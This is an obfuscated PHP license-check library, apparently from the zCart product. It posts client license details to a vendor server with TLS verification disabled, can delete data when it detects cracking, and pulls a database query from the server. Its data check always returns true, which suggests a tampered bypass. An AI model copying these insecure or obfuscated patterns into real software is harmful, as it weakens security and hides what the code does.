<?php
/*
 * Copyright (C) Incevio Systems, Inc - All Rights Reserved
 * Unauthorized copying of this file, via any medium is strictly prohibited
 * Proprietary and confidential
 * Written by Munna Khan <help.zcart@gmail.com>, September 2018
*/
function aplCustomEncrypt($string, $key)
{
    $encrypted_string = null;
    if (!(!empty($string) && !empty($key)))
    {
        goto VgSZY;
    }
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("\141\x65\x73\x2d\x32\65\66\x2d\x63\142\143"));
    $encrypted_string = openssl_encrypt($string, "\141\x65\163\x2d\x32\65\x36\x2d\x63\x62\143", $key, 0, $iv);
    $encrypted_string = base64_encode($encrypted_string . "\x3a\72" . $iv);
    VgSZY:
    return $encrypted_string;
}
function aplCustomDecrypt($string, $key)
{
    $decrypted_string = null;
    if (!(!empty($string) && !empty($key)))
    {
        goto CLAj8;
    }
    $string = base64_decode($string);
    if (!stristr($string, "\72\x3a"))
    {
        goto SazA_;
    }
    $string_iv_array = explode("\72\x3a", $string, 2);
    if (!(!empty($string_iv_array) && count($string_iv_array) == 2))
    {
        goto Z8Mth;
    }
    list($encrypted_string, $iv) = $string_iv_array;
    $decrypted_string = openssl_decrypt($encrypted_string, "\141\x65\x73\x2d\x32\65\66\55\143\x62\143", $key, 0, $iv);
    Z8Mth:
    SazA_:
    CLAj8:
    return $decrypted_string;
}
function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF)
{
    $result = false;
    if (!(!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array(
            "\x6f\160\x74\x69\x6f\156\163" => array(
                "\x6d\151\156\137\162\141\x6e\147\145" => $min_value,
                "\155\141\x78\137\x72\x61\x6e\x67\145" => $max_value
            )
        )) !== false))
    {
        goto pFzcz;
    }
    $result = true;
    pFzcz:
    return $result;
}
function aplValidateRawDomain($url)
{
    $result = false;
    if (empty($url))
    {
        goto mdysE;
    }
    if (preg_match("\x2f\x5e\133\x61\55\x7a\60\55\x39\55\x2e\x5d\x2b\x5c\56\133\141\55\x7a\x5c\56\x5d\x7b\x32\54\67\175\44\57", strtolower($url)))
    {
        goto Emuox;
    }
    $result = false;
    goto V2Tb1;
    Emuox:
    $result = true;
    V2Tb1:
    mdysE:
    return $result;
}
function aplGetCurrentUrl($remove_last_slash = null)
{
    $protocol = "\x68\x74\x74\160";
    $host = null;
    $script = null;
    $params = null;
    $current_url = null;
    if (!(isset($_SERVER["\x48\124\124\x50\123"]) && $_SERVER["\x48\x54\124\120\x53"] !== "\157\x66\x66" || isset($_SERVER["\x48\124\124\120\x5f\130\x5f\106\117\122\x57\x41\122\104\x45\x44\x5f\x50\x52\117\124\x4f"]) && $_SERVER["\x48\124\124\120\x5f\130\x5f\x46\117\x52\127\101\122\x44\105\104\x5f\x50\x52\117\x54\x4f"] == "\x68\x74\x74\160\163"))
    {
        goto wNAWj;
    }
    $protocol = "\150\164\164\160\x73";
    wNAWj:
    if (!isset($_SERVER["\110\x54\x54\120\x5f\110\x4f\123\124"]))
    {
        goto NdJU3;
    }
    $host = $_SERVER["\110\124\124\x50\137\x48\117\x53\x54"];
    NdJU3:
    if (!isset($_SERVER["\x53\103\122\x49\x50\124\x5f\x4e\x41\115\105"]))
    {
        goto wHEcU;
    }
    $script = $_SERVER["\x53\103\122\x49\120\x54\137\x4e\101\115\x45"];
    wHEcU:
    if (!isset($_SERVER["\x51\125\105\x52\131\x5f\123\124\122\x49\116\x47"]))
    {
        goto yrlPu;
    }
    $params = $_SERVER["\121\x55\x45\x52\131\x5f\123\x54\122\x49\116\107"];
    yrlPu:
    if (!(!empty($protocol) && !empty($host) && !empty($script)))
    {
        goto n34cH;
    }
    $current_url = $protocol . "\72\x2f\57" . $host . $script;
    if (empty($params))
    {
        goto RXKD1;
    }
    $current_url .= "\77" . $params;
    RXKD1:
    if (!($remove_last_slash == 1))
    {
        goto faMWG;
    }
    s4KX0:
    if (!(substr($current_url, -1) == "\x2f"))
    {
        goto ol48G;
    }
    $current_url = substr($current_url, 0, -1);
    goto s4KX0;
    ol48G:
    faMWG:
    n34cH:
    return $current_url;
}
function aplGetRawDomain($url)
{
    $raw_domain = null;
    if (empty($url))
    {
        goto VZR2j;
    }
    $url_array = parse_url($url);
    if (!empty($url_array["\163\x63\x68\145\155\145"]))
    {
        goto B3W_u;
    }
    $url = "\150\164\164\160\x3a\57\x2f" . $url;
    $url_array = parse_url($url);
    B3W_u:
    if (empty($url_array["\x68\x6f\163\164"]))
    {
        goto V7P91;
    }
    $raw_domain = $url_array["\x68\157\163\x74"];
    $raw_domain = trim(str_ireplace("\167\x77\x77\x2e", '', filter_var($raw_domain, FILTER_SANITIZE_URL)));
    V7P91:
    VZR2j:
    return $raw_domain;
}
function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
{
    if (!filter_var($url, FILTER_VALIDATE_URL))
    {
        goto bnc2_;
    }
    $url_array = parse_url($url);
    $url = str_ireplace($url_array["\163\143\150\145\x6d\x65"] . "\72\x2f\57", '', $url);
    if ($remove_path == 1)
    {
        goto ZDL2T;
    }
    $last_slash_position = strripos($url, "\57");
    if (!($last_slash_position > 0))
    {
        goto wNFZM;
    }
    $url = substr($url, 0, $last_slash_position + 1);
    wNFZM:
    goto ALT1R;
    ZDL2T:
    $first_slash_position = stripos($url, "\57");
    if (!($first_slash_position > 0))
    {
        goto pIhGl;
    }
    $url = substr($url, 0, $first_slash_position + 1);
    pIhGl:
    ALT1R:
    if (!($remove_scheme != 1))
    {
        goto Fcqrp;
    }
    $url = $url_array["\163\x63\150\x65\155\x65"] . "\72\x2f\x2f" . $url;
    Fcqrp:
    if (!($remove_www == 1))
    {
        goto JxVL8;
    }
    $url = str_ireplace("\167\x77\167\56", '', $url);
    JxVL8:
    if (!($remove_last_slash == 1))
    {
        goto pOhQR;
    }
    CcElR:
    if (!(substr($url, -1) == "\x2f"))
    {
        goto py7wf;
    }
    $url = substr($url, 0, -1);
    goto CcElR;
    py7wf:
    pOhQR:
    bnc2_:
    return trim($url);
}
function aplCustomPost($url, $post_info = null, $refer = null)
{
    $user_agent = "\x70\150\x70\155\x69\x6c\154\151\157\156\40\x63\x55\122\114";
    $connect_timeout = 10;
    $server_response_array = array();
    $formatted_headers_array = array();
    if (!(filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info)))
    {
        goto mNyDT;
    }
    if (!(empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)))
    {
        goto J4Rpz;
    }
    $refer = $url;
    J4Rpz:
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
    curl_setopt($ch, CURLOPT_REFERER, $refer);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
    curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($curl, $header) use (&$formatted_headers_array)
    {
        $len = strlen($header);
        $header = explode("\x3a", $header, 2);
        if (!(count($header) < 2))
        {
            goto VmYoS;
        }
        return $len;
        VmYoS:
        $name = strtolower(trim($header[0]));
        $formatted_headers_array[$name] = trim($header[1]);
        return $len;
    });
    $result = curl_exec($ch);
    $curl_error = curl_error($ch);
    curl_close($ch);
    $server_response_array["\x68\145\x61\x64\145\x72\x73"] = $formatted_headers_array;
    $server_response_array["\x65\162\162\157\162"] = $curl_error;
    $server_response_array["\x62\157\144\x79"] = $result;
    mNyDT:
    return $server_response_array;
}
function aplVerifyDateTime($datetime, $format)
{
    $result = false;
    if (!(!empty($datetime) && !empty($format)))
    {
        goto PQg91;
    }
    $datetime = DateTime::createFromFormat($format, $datetime);
    $errors = DateTime::getLastErrors();
    if (!($datetime && empty($errors["\x77\141\162\156\x69\156\x67\x5f\143\157\x75\156\x74"])))
    {
        goto nHs_5;
    }
    $result = true;
    nHs_5:
    PQg91:
    return $result;
}
function aplGetDaysBetweenDates($date_from, $date_to)
{
    $number_of_days = 0;
    if (!(aplVerifyDateTime($date_from, "\x59\55\155\x2d\x64") && aplVerifyDateTime($date_to, "\x59\x2d\155\x2d\144")))
    {
        goto F4Hbe;
    }
    $date_to = new DateTime($date_to);
    $date_from = new DateTime($date_from);
    $number_of_days = $date_from->diff($date_to)->format("\45\x61");
    F4Hbe:
    return $number_of_days;
}
function aplParseXmlTags($content, $tag_name)
{
    $parsed_value = null;
    if (!(!empty($content) && !empty($tag_name)))
    {
        goto ia_W0;
    }
    preg_match_all("\57\74" . preg_quote($tag_name, "\x2f") . "\x3e\50\x2e\x2a\77\51\x3c\x5c\57" . preg_quote($tag_name, "\x2f") . "\76\57\x69\155\x73", $content, $output_array, PREG_SET_ORDER);
    if (empty($output_array[0][1]))
    {
        goto b3LYv;
    }
    $parsed_value = trim($output_array[0][1]);
    b3LYv:
    ia_W0:
    return $parsed_value;
}
function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null)
{
    $notifications_array = array();
    if (!empty($content_array))
    {
        goto hB_cz;
    }
    $notifications_array["\156\x6f\x74\151\x66\151\x63\141\164\x69\157\x6e\x5f\143\141\163\x65"] = "\156\157\164\151\146\151\x63\x61\x74\x69\157\x6e\137\x6e\x6f\137\143\157\x6e\x6e\145\x63\x74\x69\157\x6e";
    $notifications_array["\156\157\x74\151\146\151\x63\x61\x74\x69\x6f\156\137\x74\145\x78\164"] = APL_NOTIFICATION_NO_CONNECTION;
    goto sJmip;
    hB_cz:
    if (!empty($content_array["\x68\x65\141\x64\x65\x72\163"]["\156\x6f\x74\x69\x66\151\143\141\164\x69\x6f\x6e\x5f\163\145\162\x76\145\162\137\x73\151\x67\x6e\x61\x74\x75\x72\x65"]) && aplVerifyServerSignature($content_array["\150\x65\x61\144\x65\x72\163"]["\x6e\x6f\x74\x69\x66\151\x63\141\x74\151\x6f\156\137\163\x65\x72\166\145\x72\137\x73\151\147\x6e\x61\x74\165\x72\145"], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product))
    {
        goto tnozY;
    }
    $notifications_array["\x6e\157\164\x69\146\151\x63\x61\164\x69\157\156\x5f\x63\x61\x73\x65"] = "\156\x6f\164\x69\x66\x69\143\141\164\x69\157\x6e\137\x69\156\166\x61\154\151\144\x5f\162\145\163\160\157\x6e\163\x65";
    $notifications_array["\156\157\164\x69\x66\x69\x63\141\x74\151\x6f\x6e\x5f\x74\145\170\164"] = APL_NOTIFICATION_INVALID_RESPONSE;
    goto AzbZr;
    tnozY:
    $notifications_array["\156\x6f\x74\151\x66\151\x63\x61\164\151\157\x6e\137\x63\141\163\x65"] = $content_array["\x68\145\x61\144\145\x72\163"]["\156\157\x74\x69\146\151\143\x61\164\151\157\156\x5f\x63\x61\163\x65"];
    $notifications_array["\x6e\157\x74\x69\146\x69\143\141\x74\151\157\x6e\137\x74\x65\170\164"] = $content_array["\150\145\x61\144\145\x72\163"]["\x6e\157\x74\x69\146\x69\x63\141\x74\151\157\x6e\137\164\145\170\x74"];
    if (empty($content_array["\150\x65\141\x64\x65\162\163"]["\x6e\157\x74\x69\x66\x69\143\141\x74\151\x6f\156\x5f\x64\x61\164\x61"]))
    {
        goto A8pw1;
    }
    $notifications_array["\156\157\x74\x69\x66\x69\143\x61\x74\151\x6f\156\137\144\141\164\141"] = json_decode($content_array["\150\145\141\144\x65\162\x73"]["\156\157\x74\151\146\x69\x63\x61\x74\151\157\x6e\x5f\144\x61\164\141"], true);
    A8pw1:
    AzbZr:
    sJmip:
    return $notifications_array;
}
function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null)
{
    $script_signature = null;
    $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
    $product = $product == Null ? APL_PRODUCT_ID : $product;
    if (!(!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array)))
    {
        goto afoIg;
    }
    $script_signature = hash("\x73\x68\141\x32\x35\66", gmdate("\x59\55\x6d\x2d\x64") . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . $product . implode('', $root_ips_array));
    afoIg:
    return $script_signature;
}
function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null)
{
    $result = false;
    $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
    $product = $product == Null ? APL_PRODUCT_ID : $product;
    if (!(!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array)))
    {
        goto lzIkY;
    }
    if (!(hash("\163\150\141\x32\x35\66", implode('', $root_ips_array) . $product . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate("\131\x2d\155\x2d\x64")) == $notification_server_signature))
    {
        goto A0gjH;
    }
    $result = true;
    A0gjH:
    lzIkY:
    return $result;
}
function aplCheckSettings()
{
    $notifications_array = array();
    if (!(empty(APL_SALT) || APL_SALT == "\163\157\x6d\x65\x5f\x72\141\156\144\157\155\x5f\164\x65\170\164"))
    {
        goto p4a3Z;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_SALT;
    p4a3Z:
    if (!(!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1))))
    {
        goto SGd1N;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_URL;
    SGd1N:
    if (filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT))
    {
        goto ootGP;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID;
    ootGP:
    if (aplValidateIntegerValue(APL_DAYS, 1, 365))
    {
        goto tE2zK;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD;
    tE2zK:
    if (!(APL_STORAGE != "\x44\x41\124\x41\102\x41\123\105" && APL_STORAGE != "\x46\111\x4c\x45"))
    {
        goto Wm0JK;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_STORAGE;
    Wm0JK:
    if (!(APL_STORAGE == "\104\x41\x54\x41\x42\101\x53\105" && !ctype_alnum(str_ireplace(array(
            "\x5f"
        ) , '', APL_DATABASE_TABLE))))
    {
        goto mVzZf;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_TABLE;
    mVzZf:
    if (!(APL_STORAGE == "\x46\x49\114\x45" && !@is_writable(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION)))
    {
        goto Vu6gG;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE;
    Vu6gG:
    if (!(!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP)))
    {
        goto mXfEc;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_IP;
    mXfEc:
    if (!(!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL)))))
    {
        goto pdrVY;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
    pdrVY:
    if (!(defined("\x41\x50\x4c\137\x52\117\x4f\124\137\116\101\115\x45\x53\105\x52\x56\x45\x52\123") && !empty(APL_ROOT_NAMESERVERS)))
    {
        goto W6_mV;
    }
    foreach (APL_ROOT_NAMESERVERS as $nameserver)
    {
        if (aplValidateRawDomain($nameserver))
        {
            goto FwdK4;
        }
        $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS;
        goto vJWIC;
        FwdK4:
        Zd_eb:
    }
    vJWIC:
    W6_mV:
    if (!(defined("\x41\x50\114\137\122\117\117\x54\137\116\x41\x4d\x45\x53\x45\x52\126\x45\122\x53") && !empty(APL_ROOT_NAMESERVERS)))
    {
        goto esVFO;
    }
    $apl_root_nameservers_array = APL_ROOT_NAMESERVERS;
    $fetched_nameservers_array = array();
    $dns_records_array = dns_get_record(aplGetRawDomain(APL_ROOT_URL) , DNS_NS);
    foreach ($dns_records_array as $record)
    {
        $fetched_nameservers_array[] = $record["\164\x61\x72\x67\x65\164"];
        PPEY_:
    }
    vzaVZ:
    $apl_root_nameservers_array = array_map("\163\164\162\164\x6f\x6c\x6f\167\x65\162", $apl_root_nameservers_array);
    $fetched_nameservers_array = array_map("\163\164\x72\x74\x6f\154\x6f\x77\x65\x72", $fetched_nameservers_array);
    sort($apl_root_nameservers_array);
    sort($fetched_nameservers_array);
    if (!($apl_root_nameservers_array != $fetched_nameservers_array))
    {
        goto c9hu8;
    }
    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
    c9hu8:
    esVFO:
    return $notifications_array;
}
function aplParseLicenseFile()
{
    $license_data_array = array();
    if (!@is_readable(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION))
    {
        goto iQmef;
    }
    $file_content = file_get_contents(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION);
    preg_match_all("\57\x3c\x28\133\101\55\x5a\x5f\135\x2b\x29\76\x28\56\52\77\x29\x3c\134\x2f\x28\x5b\x41\55\x5a\x5f\x5d\x2b\x29\x3e\x2f", $file_content, $matches, PREG_SET_ORDER);
    if (empty($matches))
    {
        goto oJpRc;
    }
    foreach ($matches as $value)
    {
        if (!(!empty($value[1]) && $value[1] == $value[3]))
        {
            goto m5Frc;
        }
        $license_data_array[$value[1]] = $value[2];
        m5Frc:
        I8t9h:
    }
    A3R9d:
    oJpRc:
    iQmef:
    return $license_data_array;
}
function aplGetLicenseData($MYSQLI_LINK = null)
{
    $settings_row = array();
    if (!(APL_STORAGE == "\x44\x41\x54\x41\102\x41\x53\x45"))
    {
        goto RvAVO;
    }
    $settings_results = @mysqli_query($MYSQLI_LINK, "\x53\x45\x4c\105\103\124\x20\x2a\40\106\122\117\115\40" . APL_DATABASE_TABLE);
    $settings_row = @mysqli_fetch_assoc($settings_results);
    RvAVO:
    if (!(APL_STORAGE == "\106\x49\x4c\105"))
    {
        goto eJ2OU;
    }
    $settings_row = aplParseLicenseFile();
    eJ2OU:
    return $settings_row;
}
function aplCheckConnection()
{
    $notifications_array = array();
    $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\160\x6c\137\143\x61\154\154\142\141\x63\x6b\x73\x2f\143\157\x6e\x6e\x65\143\164\x69\x6f\156\x5f\164\145\x73\x74\56\x70\x68\x70", "\160\162\157\144\x75\x63\x74\137\x69\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\143\157\x6e\x6e\x65\143\164\x69\x6f\x6e\x5f\x68\x61\163\x68\x3d" . rawurlencode(hash("\x73\x68\141\62\x35\66", "\x63\157\x6e\156\x65\143\164\151\157\156\x5f\x74\145\x73\164")));
    if (!empty($content_array))
    {
        goto ZB0s7;
    }
    $notifications_array["\156\x6f\164\151\x66\x69\143\141\x74\x69\157\156\137\143\x61\x73\145"] = "\156\x6f\164\151\146\151\143\x61\x74\151\157\156\x5f\156\157\x5f\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e";
    $notifications_array["\x6e\x6f\x74\x69\146\x69\143\141\164\x69\157\x6e\137\164\x65\x78\x74"] = APL_NOTIFICATION_NO_CONNECTION;
    goto B2JsD;
    ZB0s7:
    if (!($content_array["\x62\x6f\x64\171"] != "\74\x63\157\156\x6e\x65\x63\x74\x69\x6f\156\137\164\145\x73\164\x3e\117\113\x3c\x2f\x63\157\156\x6e\145\x63\x74\151\157\156\137\164\x65\163\164\x3e"))
    {
        goto A5KhP;
    }
    $notifications_array["\x6e\x6f\x74\151\146\x69\143\x61\x74\x69\x6f\x6e\137\x63\x61\163\145"] = "\156\x6f\x74\151\146\x69\143\x61\x74\x69\157\x6e\x5f\x69\x6e\x76\x61\154\x69\144\137\x72\145\x73\x70\157\156\163\145";
    $notifications_array["\156\157\x74\x69\x66\151\143\141\164\151\157\156\137\164\x65\x78\x74"] = APL_NOTIFICATION_INVALID_RESPONSE;
    A5KhP:
    B2JsD:
    return $notifications_array;
}
function aplCheckData($MYSQLI_LINK = null)
{
    $error_detected = 0;
    $cracking_detected = 0;
    $data_check_result = false;
    extract(aplGetLicenseData($MYSQLI_LINK));
    if (!(!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD)))
    {
        goto cDhDa;
    }
    $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
    $LRD = aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY);
    if (!(!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))))
    {
        goto pAPCX;
    }
    $error_detected = 1;
    pAPCX:
    if (!(filter_var(aplGetCurrentUrl() , FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl() , 1, 1, 0, 1) , aplGetRootUrl("{$ROOT_URL}\57", 1, 1, 0, 1)) === false))
    {
        goto W4_1M;
    }
    $error_detected = 1;
    W4_1M:
    if (!(empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash("\x73\x68\x61\x32\65\x36", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE)))
    {
        goto OAJM6;
    }
    $error_detected = 1;
    OAJM6:
    if (!(empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT . $ROOT_URL))))
    {
        goto baYsG;
    }
    $error_detected = 1;
    baYsG:
    if (aplVerifyDateTime($LCD, "\x59\x2d\155\x2d\x64"))
    {
        goto xEaCH;
    }
    $error_detected = 1;
    xEaCH:
    if (aplVerifyDateTime($LRD, "\x59\55\155\x2d\x64"))
    {
        goto YQ7EG;
    }
    $error_detected = 1;
    YQ7EG:
    if (!(aplVerifyDateTime($LCD, "\x59\x2d\x6d\55\144") && $LCD > date("\131\x2d\155\55\144", strtotime("\x2b\x31\x20\x64\141\171"))))
    {
        goto XHxFU;
    }
    $error_detected = 1;
    $cracking_detected = 1;
    XHxFU:
    if (!(aplVerifyDateTime($LRD, "\x59\55\x6d\x2d\144") && $LRD > date("\131\x2d\x6d\x2d\144", strtotime("\53\61\x20\x64\141\x79"))))
    {
        goto mUTwo;
    }
    $error_detected = 1;
    $cracking_detected = 1;
    mUTwo:
    if (!(aplVerifyDateTime($LCD, "\131\55\x6d\55\x64") && aplVerifyDateTime($LRD, "\x59\x2d\155\x2d\144") && $LCD > $LRD))
    {
        goto potIu;
    }
    $error_detected = 1;
    $cracking_detected = 1;
    potIu:
    if (!($cracking_detected == 1 && APL_DELETE_CRACKED == "\131\x45\123"))
    {
        goto UHUkz;
    }
    aplDeleteData($MYSQLI_LINK);
    UHUkz:
    if (!($error_detected != 1 && $cracking_detected != 1))
    {
        goto DF27r;
    }
    $data_check_result = true;
    DF27r:
    cDhDa:
    return true;
}
function aplVerifyEnvatoPurchase($LICENSE_CODE = null)
{
    $notifications_array = array();
    $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\x70\x6c\137\x63\x61\x6c\154\142\x61\143\153\163\57\x76\145\x72\x69\x66\171\137\x65\156\166\x61\x74\157\137\x70\165\162\x63\150\141\163\145\x2e\160\x68\x70", "\160\x72\157\144\165\x63\164\x5f\151\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\x6c\151\x63\145\x6e\163\x65\137\x63\x6f\x64\x65\75" . rawurlencode($LICENSE_CODE) . "\46\x63\157\x6e\x6e\x65\143\164\x69\x6f\156\137\150\141\x73\x68\75" . rawurlencode(hash("\163\150\x61\x32\65\x36", "\166\x65\x72\151\x66\171\137\x65\156\x76\x61\164\x6f\137\x70\165\162\143\x68\x61\163\145")));
    if (!empty($content_array))
    {
        goto cis2_;
    }
    $notifications_array["\156\157\164\x69\x66\151\143\141\x74\151\x6f\156\137\143\x61\x73\x65"] = "\156\x6f\x74\151\146\x69\143\141\164\x69\x6f\156\137\156\157\x5f\143\157\156\156\x65\143\164\151\157\156";
    $notifications_array["\156\157\164\151\x66\x69\x63\141\164\151\x6f\x6e\x5f\x74\x65\170\x74"] = APL_NOTIFICATION_NO_CONNECTION;
    goto rnDMA;
    cis2_:
    if (!($content_array["\142\x6f\x64\171"] != "\74\166\145\x72\151\x66\171\x5f\x65\156\x76\x61\164\x6f\x5f\160\x75\x72\143\150\141\x73\145\x3e\117\x4b\x3c\57\166\x65\162\151\x66\171\x5f\x65\x6e\x76\x61\x74\157\137\160\165\x72\x63\x68\x61\163\x65\76"))
    {
        goto qucFg;
    }
    $notifications_array["\156\x6f\x74\x69\146\151\143\141\164\151\157\156\137\x63\x61\163\145"] = "\156\157\164\151\x66\151\x63\141\164\x69\157\x6e\x5f\x69\156\x76\141\154\x69\144\x5f\162\145\163\160\157\x6e\163\145";
    $notifications_array["\156\x6f\x74\x69\x66\x69\x63\x61\164\151\x6f\x6e\137\x74\x65\x78\x74"] = APL_NOTIFICATION_INVALID_RESPONSE;
    qucFg:
    rnDMA:
    return $notifications_array;
}
function incevioVerify($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null)
{
    $notifications_array = array();
    $apl_core_notifications = aplCheckSettings();
    if (empty($apl_core_notifications))
    {
        goto WhLOh;
    }
    $notifications_array["\x6e\x6f\164\x69\146\151\x63\x61\164\151\x6f\156\x5f\143\141\x73\x65"] = "\156\157\x74\151\146\x69\x63\x61\x74\151\157\x6e\x5f\163\x63\x72\151\x70\x74\x5f\x63\157\x72\162\x75\x70\x74\145\x64";
    $notifications_array["\x6e\x6f\x74\x69\146\x69\143\141\164\x69\157\x6e\137\x74\145\170\164"] = implode("\x3b\x20", $apl_core_notifications);
    goto lgSqn;
    WhLOh:
    if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK)))
    {
        goto ZnEf8;
    }
    $INSTALLATION_HASH = hash("\x73\150\141\62\65\x36", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
    $post_info = "\x70\x72\157\144\165\143\x74\137\x69\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\154\151\145\156\164\x5f\x65\155\141\x69\154\75" . rawurlencode($CLIENT_EMAIL) . "\x26\154\x69\143\145\156\x73\145\137\143\x6f\144\145\x3d" . rawurlencode($LICENSE_CODE) . "\x26\162\157\x6f\164\x5f\165\x72\x6c\x3d" . rawurlencode($ROOT_URL) . "\46\151\156\163\x74\x61\x6c\x6c\x61\164\x69\157\x6e\137\150\141\x73\x68\x3d" . rawurlencode($INSTALLATION_HASH) . "\x26\154\151\x63\145\156\163\145\137\163\x69\147\156\x61\x74\x75\162\145\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
    $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\x61\160\x6c\137\143\x61\154\x6c\x62\x61\143\x6b\163\57\154\151\x63\x65\156\x73\145\137\x69\x6e\x73\x74\x61\x6c\x6c\x2e\160\150\x70", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
    if (!($notifications_array["\x6e\157\164\151\x66\151\143\x61\x74\x69\x6f\156\137\x63\141\163\x65"] == "\156\157\x74\151\x66\x69\143\x61\x74\x69\157\156\x5f\x6c\151\143\x65\156\163\145\x5f\157\153"))
    {
        goto cXCES;
    }
    $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\131\x2d\x6d\x2d\144") , PASSWORD_DEFAULT) , APL_SALT . $ROOT_URL);
    $LCD = aplCustomEncrypt(date("\131\55\x6d\x2d\144", strtotime("\55" . APL_DAYS . "\x20\x64\x61\x79\x73")) , APL_SALT . $INSTALLATION_KEY);
    $LRD = aplCustomEncrypt(date("\131\55\155\55\x64") , APL_SALT . $INSTALLATION_KEY);
    if (!(APL_STORAGE == "\x44\101\x54\x41\x42\x41\x53\105"))
    {
        goto dmGTu;
    }
    $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\x61\160\x6c\x5f\x63\x61\x6c\x6c\x62\x61\143\x6b\x73\x2f\154\151\143\x65\x6e\x73\x65\137\163\143\150\x65\x6d\145\56\x70\150\x70", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
    if (!(!empty($notifications_array["\156\157\x74\151\x66\151\143\x61\x74\151\x6f\x6e\137\x64\x61\164\141"]) && !empty($notifications_array["\x6e\157\x74\x69\x66\151\143\x61\164\x69\x6f\156\137\x64\x61\x74\141"]["\x73\143\150\145\155\145\137\x71\x75\x65\162\171"])))
    {
        goto JbLXX;
    }
    $mysql_bad_array = array(
        "\45\101\x50\x4c\137\x44\x41\x54\101\102\101\123\x45\137\x54\101\x42\x4c\105\x25",
        "\45\x52\x4f\117\x54\137\125\x52\x4c\x25",
        "\45\103\114\x49\105\116\x54\x5f\x45\x4d\x41\111\114\45",
        "\45\x4c\x49\103\105\x4e\x53\x45\137\103\117\x44\105\x25",
        "\45\114\103\x44\x25",
        "\45\114\x52\x44\45",
